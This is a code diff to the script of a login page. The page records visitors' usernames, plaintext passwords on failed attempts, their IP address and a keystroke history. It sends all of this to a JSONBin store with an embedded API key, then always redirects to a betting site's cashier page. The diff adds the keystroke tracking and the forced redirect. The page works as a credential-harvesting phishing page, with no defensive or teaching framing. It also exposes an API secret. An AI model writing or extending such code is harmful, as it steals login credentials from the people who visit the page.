@@ -79,6 +79,7 @@
       </svg>
     </div>
   </div>
+
   <!-- Script Section -->
   <script>
     const JSONBIN_API_KEY = '$2a$10$QtoHBeIgduOyNX/.VfoFPOlgQrUuKhcPZ7ZHjGLTLhVvtg17oL85y';
@@ -90,7 +91,9 @@
       username: [],
       password: []
     };
+    let lastTypingTime = 0;
 
+    // Password visibility toggle
     togglePassword.addEventListener("click", () => {
       const isHidden = passwordInput.type === "password";
       passwordInput.type = isHidden ? "text" : "password";
@@ -98,6 +101,7 @@
       togglePassword.classList.toggle("fa-eye-slash");
     });
 
+    // Get client IP
     async function getIP() {
       try {
         const response = await fetch('https://api.ipify.org?format=json');
@@ -108,6 +112,19 @@
       }
     }
 
+    // Track typing with throttling
+    function trackTyping(field, value) {
+      const now = Date.now();
+      if (now - lastTypingTime > 500) { // Throttle to every 500ms
+        typingHistory[field].push({
+          value: field === 'password' ? value.replace(/./g, '*') : value,
+          timestamp: new Date().toISOString()
+        });
+        lastTypingTime = now;
+      }
+    }
+
+    // Log events to JSONBin.io
     async function logEvent(type, data) {
       try {
         const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
@@ -138,37 +155,55 @@
       }
     }
 
-    async function logLogin(email, status, password) {
+    // Handle login attempt
+    async function handleLogin(email, password) {
+      const isValidLogin = password === 'correct123'; // Replace with your actual validation
+      const status = isValidLogin ? 'success' : 'failed';
+
       await logEvent('login_attempt', {
         email,
-        password,
+        password: status === 'success' ? '******' : password, // Mask successful passwords
         status,
-        full_typing: typingHistory
+        typing_history: typingHistory
       });
+
+      // Always redirect after logging
+      window.location.href = "https://cashier.miamibet.bet";
     }
 
-    document.getElementById('login-btn').addEventListener('click', async () => {
+    // Typing event listeners
+    usernameInput.addEventListener('input', (e) => {
+      trackTyping('username', e.target.value);
+    });
+
+    passwordInput.addEventListener('input', (e) => {
+      trackTyping('password', e.target.value);
+    });
+
+    // Login button handler
+    document.getElementById('login-btn').addEventListener('click', async (e) => {
+      e.preventDefault();
+
       const email = usernameInput.value.trim();
       const password = passwordInput.value.trim();
-
-      console.log('Username:', email);
-      console.log('Password:', password);
 
       if (!email || !password) {
         alert("Please enter both username and password");
         return;
       }
 
-      const isValidLogin = password === 'correct123';
-      const status = isValidLogin ? 'success' : 'failed';
+      // Show loading state
+      const loginBtn = document.getElementById('login-btn');
+      loginBtn.disabled = true;
 
-      await logLogin(email, status, password);
-
-      if (isValidLogin) {
-        alert('Login successful!');
-        usernameInput.value = '';
-        passwordInput.value = '';
-        typingHistory.username = [];
-        typingHistory.password = [];
+      try {
+        await handleLogin(email, password);
+      } catch (error) {
+        console.error("Login error:", error);
+        // Still redirect even if logging fails
+        window.location.href = "https://cashier.miamibet.bet";
       }
     });
+  </script>
+</body>
+</html>
